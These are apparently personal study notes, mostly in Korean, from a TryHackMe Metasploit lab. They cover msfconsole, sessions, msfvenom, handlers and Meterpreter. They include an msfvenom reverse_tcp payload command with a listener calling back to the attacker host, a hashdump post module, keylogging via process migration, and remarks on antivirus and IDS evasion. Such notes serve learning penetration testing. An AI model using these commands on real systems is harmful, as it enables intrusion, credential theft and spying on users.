



## msf

msfconsole 은 context 로 관리된다. 
그러니까 전역 변수로 세팅되지 않으면 모든 파라미터 세팅들은 사용하고자 하는 모듈을 변경하면 날아갈거다.
로컬 변수 세팅은 
`set rhosts 10.10.165.39`
전역 변수 세팅은 
`setg rhosts 10.10.165.39`
로 가능하다

use module
을 하게되면 context 가 변경됨. 이를 enter 라고 함. 

`show options`
는 선택한 exploit 과 관련된 옵션들을 출력해줌. 
context 에 따라 다른 출력물일것이다. 이를 테면 RHOSTS, RPORT 같은 variable 을 세팅하라고 할 것이다. 
반면에 post-exploitation module 은 SESSION ID 만 요구할 것이다. 
session 은 post-exploitation module 이 사용할 target system 에 존재하는 연결을 의미함. 

`show payloads`

`back` command 를 사용하면 context 를 벗어날 수 있음. 
`info` 를 context 내에서 모듈에 대한 사용하면 많은 정보를 준다.

`search` command 를 사용하면 CVE 와 관련된 exploit 들을 검색해줌. 
그러니까 함께 준 search parameter 와 관련된 모듈들을 찾아주는 것임. 
예를 들면, CVE number 나 exploit name(eternealblue, heartbleed, 등등) 혹은 타겟 시스템을 사용해서 검색을 수행할 수 있다는 것 

Meterpreter ; 
meterpreter agent 라는 Payload 가 있음. 이게 target system 에 로드돼서 얘가 내 컴퓨터에 다시 접속하는 형태로 연결되면 meterpreter prompt 로 볼 수 있음. 

# 모듈 사용하기

모든 모듈 파라미터를 설정했다면 이제 `exploit` 커맨드를 사용해서 모듈을 실행시킬 수 있다. 
run 이라고 하는 커맨드도 alias 로 제공되는데 그 이유는 exploit 이 아닌 모듈들에 exploit 을 하는게 말이 안되기 때문이다. 
예를 들면 port scanner, vulnerability scanner 같은 것들을 실행하는데 exploit 이라고 하는 것은 이상하기 때문. 

exploit -z 로 실행하면 exploit 을 실행하고 session 이 열리자마자 session 을 background 로 감춤


# 세션

vulnerability 가 성공적으로 exploit 되면 session 이 생성될 것이다. target system 과 metasploit 간에 생성된 통신 채널임. 

background command 를 이용해서 session prompt 를 background 로 감추고 msfconsole prompt 로 돌아갈 수 있음. 
혹은 ctrl+z 로도 백그라운드로 만들 수 있음. 


sessions command 로 현재 존재하는 session 들을 확인할 수 있음. 
세션에 붙으려면 session -i 2 이런 식으로 attach 가능


# db 이용하기

postgresql 을 서비스로 실행함
systemctl start postgresql 
database init
msfdb init
workspace add
workspace -a tryhackme
nmap 으로 스캔한 결과물을 모두 db 에 저장
db_nmap -sV -p- 10.10.12.229
db 에 저장된 결과를 기반으로 host 들 나열
hosts
서비스들 나열
services


Metasploit 을 사용하면 어떤 치명적인 취약점도 'low hanging fruit' 으로 보이게 된다. 
쉽게 파악하고 이용할 수 있는 취약점이란 뜻이다. 그리고 어떤 시스템에 대한 발판을 얻게 해줄 수 있고 어떤 경우에는 root 또는 관리자 권한을 얻게 해줄 수 있다는 뜻이다. 

Metasploit 을 사용해서 취약점을 찾는 것은 대상에 대해 scan 하고 fingerprint 를 하는 것에 크게 의존한다. 
이런 단계에서 더 잘할수록 MEtasploit 은 더 많은 옵션들을 제공할 것이다. 
예를 들면 target system 에 돌고 있는 vnc service 가 있을 때 Metasploit 에서 search function 을 사용할 수 있다. 
그 결과는 payload 와 post module 들을 갖고 있다. 


대부분의 exploit 들은 default payload 프리셋을 지니고 있을텐데, 언제든지 show payload 를 사용해서 사용할 수 있는 목록들을 볼 수 있음. 

잘 동작하는 payload 를 선택하는 거는 trial and error 가 될 수도 있다. 왜냐하면 방화벽 룰, 안티바이러스 같은 OS 제한이나 환경제한 때문에.

msfvenom 은 msfpayload 랑 msfencode 를 대체해버린 녀석이고 이게 payload 를 생성하도록 도와줄 것이다. 

msfvenom 이 metasploit framework 상에서 가능한 모든 payload 에 접근할 수 있게 해준다. 그리고 매우 다른 포맷들에서 payload 를 생성하게 해줄 것이다. 
예를 들면 php, exe, dll, elf 등의 포맷들. 그리고 다양한 target system 에 대해 가능함. 


Encoders 

일반적인 상식과 반대로 encoders 는 antivirus 를 우회하는게 목표가 아니다. 이름이 암시하는 것과 같이 payload 를 encode 할 뿐이다. 
어떤 antivirus software 에 대해서 효과적일 수 있으나 현대 난독화 기술을 사용하거나 shellcode 를 삽입하는 방법을 배우는 것이 더 좋은 우회방법이다. 
encoding 예시는 다음과 같음
-e param 을 이용해서 php version 의 meterpreter 가 base64 로 인코딩 되고 output format 은 raw다. 


Handlers

reverse shell 을 사용하는 exploit 과 유사하게 MSFvenom payload 에 의해 생성된 incoming connection 을 받아야할 수도 있다. 
exploit omdule 을 사용할 때 이 부분이 자동으로 exploit module 에 의해 처리가 된다. 이 때 reverse shell 을 구성할 때 어떻게 payload options title 이 보여질지 기억할 거다. catching a shell 이라는 용어가 일반적으로 target 으로부터 연결을 받는다는 용어로 사용된다. reverse shell 이나 meterpreter callbacks 들은 쉽게 handler 를 사용해서 catch 할 수 있음. 

결국 handlers 를 이용해서 들어오는 connection 을 처리하는 것을 할 수 있고, 어떤 처리를 해줄지를 payload 로서 지정한다. 

THM 에서 나온 문제에서는 MSFvenom 으로 만든 payload 를 target system 에 주입( 이 과정은 단순히 scp 나 wget 을 통해 처리함) 한 뒤 
attacking machine 에서 handler 에 payload 를 등록해서 대기하도록 한다. 이 때 두 payload 는 한 쌍을 이룸. 

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost=10.10.x.x
set lport=xxxx
run
```

이후 target machine 에서 직접 payload 를 실행한다. 실제 시나리오에서는 이 부분도 어떤 메커니즘으로 실행되게 해야겠지
그러면 meterpreter 가 뜨면서 session 이 연결됨. 
위 과정에서 payload 를 지정안했다면 실패가 나게 되는데, 한 번이라도 실패가 생기면 이후 과정에도 문제가 발생하기때문에 다시 msfconsole 을 실행해야한다. 
session 이 연결되면 background 로 숨기고 post module 을 실행하러 간다. 

```
background
use post/linux/gather/hashdump
set session 1
run
```


Meterpret 

Meterpreter 는 metasploit payload 임. penetration testing process 를 다양한 components 들로 지원하고 있다. 
target system 에서 실행되며 command and control architecture 속의 agent 로서 역할한다. 
그러니까 그냥 remote controller agent
target operating system , file 들과 상호작용할 거고 meterpreter 의 특별한 command 를 사용하게 될거다. 

target system 에 따라 다양한 기능들을 제공하는 여러 버전들이 존재한다. 

Meterpreter 의 동작방식은 다음과 같다. 

target system 에서 실행되지만 설치된 것은 아니다. memory 상에서 돌아가지만 target system 의 disk 에는 존재하지 않음. 
이런 기능은 antivirus scan 에서 잡히지 않기 위함이다. 
기본적으로 많은 antivirus software 는 디스크 상의 새 파일들을 스캔한다. 

또한 meterpreter 는 network 기반의 IPS(Intrusion Prevention System, 침투 방지 시스템) 과 IDS(Intrusion Detection System, 침투 감지 시스템) 에 의해 
발견되는 것도 피하고자 한다. 암호화된 통신으로 attacking system 과 통신하여 회피함. target organization 이 복호화하지 않고 암호화된 트래픽을 조사하지 않는다면 IPS, IDS 솔루션은 그런 활동을 감지할 수 없다. 

예를 들면, meterpreter 로 연결된 세션에서 
pid 와 ps 로 내 프로세스를 찾아보면 spoolsv.exe 로 나온다. 
그렇다면 이 process 가 사용하는 라이브러리는 특별할까? 
`tasklist /m /fi "pid eq 1304"` 로 확인해보더라도 주목할만한 dll 이 나오지 않을 것이다. 


meterpreter payload 는 두 종류가 있다. 
* stagged payalod
  * 두 단계로 payload 가 전송됨. 첫 번째 단계의 payload 를 stager 라고 하는데 이게 설치되고 난 뒤 나머지 payload 를 요청하는 형태.
  * 첫 pyaload 사이즈를 줄일 수 있음.
  * 이는 탐지를 회피하거나 네트워크 제약을 우회하는 데 유리하기 때문
* inline payload
  * 한 단계에 바로 payload 를 보내는 방법.
 

meterpreter 버전을 선택할 때는 다음의 세가지 요소를 고려해라

* target os ( windows? mac? android? or ...)
* target system 에서 사용할 수 있는 컴포넌트( python 이 설치됐는가? php website 인가? ...)
* target system 에 연결가능한 네트워크 타입 ( raw TCPc onnection 을 허용하는가? https reverse connection 만 할 수 있는가? ...)

msfvenom 으로 생성한 standalone payload 를 사용하지 않을 거라면, 선택은 exploit 에 의해 제한될 거다. 
어떤 exploit 들은 default meterpreter payload 가 있다는 걸 알것이다. 

Meterpreter 는 단순히 reverse shell 만은 아님. 
meterpreter> help 

라고 치면 가능한 커맨드 목록이 나온다. 

Core commands

background: Backgrounds the current session
exit: Terminate the Meterpreter session
guid: Get the session GUID (Globally Unique Identifier)
help: Displays the help menu
info: Displays information about a Post module
irb: Opens an interactive Ruby shell on the current session
load: Loads one or more Meterpreter extensions
migrate: Allows you to migrate Meterpreter to another process
run: Executes a Meterpreter script or Post module
sessions: Quickly switch to another session
File system commands

cd: Will change directory
ls: Will list files in the current directory (dir will also work)
pwd: Prints the current working directory
edit: will allow you to edit a file
cat: Will show the contents of a file to the screen
rm: Will delete the specified file
search: Will search for files
upload: Will upload a file or directory
download: Will download a file or directory
Networking commands

arp: Displays the host ARP (Address Resolution Protocol) cache
ifconfig: Displays network interfaces available on the target system
netstat: Displays the network connections
portfwd: Forwards a local port to a remote service
route: Allows you to view and modify the routing table
System commands

clearev: Clears the event logs
execute: Executes a command
getpid: Shows the current process identifier
getuid: Shows the user that Meterpreter is running as 
kill: Terminates a process
pkill: Terminates processes by name
ps: Lists running processes
reboot: Reboots the remote computer
shell: Drops into a system command shell
shutdown: Shuts down the remote computer
sysinfo: Gets information about the remote system, such as OS
Others Commands (these will be listed under different menu categories in the help menu)

idletime: Returns the number of seconds the remote user has been idle
keyscan_dump: Dumps the keystroke buffer
keyscan_start: Starts capturing keystrokes
keyscan_stop: Stops capturing keystrokes
screenshare: Allows you to watch the remote user's desktop in real time
screenshot: Grabs a screenshot of the interactive desktop
record_mic: Records audio from the default microphone for X seconds
webcam_chat: Starts a video chat
webcam_list: Lists webcams
webcam_snap: Takes a snapshot from the specified webcam
webcam_stream: Plays a video stream from the specified webcam
getsystem: Attempts to elevate your privilege to that of local system
hashdump: Dumps the contents of the SAM database


이 중 몇가지를 짚자면, getuid 로 내 권한 정도를 알 수 있다. 
예를 들면, 
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
라고 나오면 windows system 에서 admin 권한임. 

migrate 은 다른 프로세스로 migration 하는 것이다. 예를 들면, word processor 가 target system 에서 실행되고 있는 것을 확인했다. 
word processor 로 migrate 하면 word processor 에 유저가 타이핑하는 keystroke 를 캡쳐할 수 있다. 
어떤 Meterpreter version 은 keyscan_start/stop/dump 라는 것을 제공할텐데, meterpreter 가 keylogger 처럼 동작하게 할 수 있다. 
다른 프로세스로 migrate 하는 거는 더 안정적인 meterpreter session 을 확보하는데 도움을 줄 수 있다. 

어떤 프로세스로 migration 하기 위해서는 migrate PID 를 하면 된다. 


Hashdump

hashdump 커맨드는 SAM database 의 내용을 리스팅 해준다. SAM(Security Account Manager) 데이터베이스는 유저의 암호를 windows system 상에 저장하고 있다. 
이 암호들은 NTLM(New Technology LAN Manager ) format 으로 저장되어있다. 

수학적으로 이 해쉬값들을 crack 할 수는 없지만 cleartext password 를 online NTLM database 를 사용하거나 rainbow table attack 을 이용해서 확인할 수 있다. 
이 hash 들은 또 Pass-the-Hash attack 에 사용해서 이 유저들이 접근가능한 네트워크 상의 다른 시스템들에 인증할 수 있다. 


Search

특정 파일들이나 원하는 정보가 있는 곳을 찾는데 유용함. 

```
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
```



